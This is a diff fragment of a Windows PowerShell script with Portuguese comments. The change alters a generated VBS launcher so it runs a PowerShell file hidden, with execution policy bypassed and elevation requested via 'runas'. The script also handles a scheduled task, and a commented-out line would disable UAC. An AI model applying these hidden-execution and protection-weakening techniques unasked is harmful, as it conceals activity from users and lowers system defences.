@@ -11,10 +11,10 @@ $destino6 = 'C:\Windows\System32\Int-service.xml'
 
 # --- CRIAÇÃO DO FICHEIRO vbs ---
 $vbsContent = @"
-Set shell = CreateObject("WScript.Shell")
-psPath = "$perCheck"
-
-shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
+CreateObject("Shell.Application").ShellExecute _
+    "powershell.exe", _
+    "-W Hidden -EP Bypass -File ""$perCheck""", _
+    "", "runas", 0
 "@
 
 # --- CRIAÇÃO DO FICHEIRO PS1 ---
@@ -92,7 +92,7 @@ if (Test-IsAdmin) {
 
     #New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
 
-    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:$false
+    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false
     Remove-Item $perCheck -Force
     Remove-Item $perCheckVbs -Force
     exit
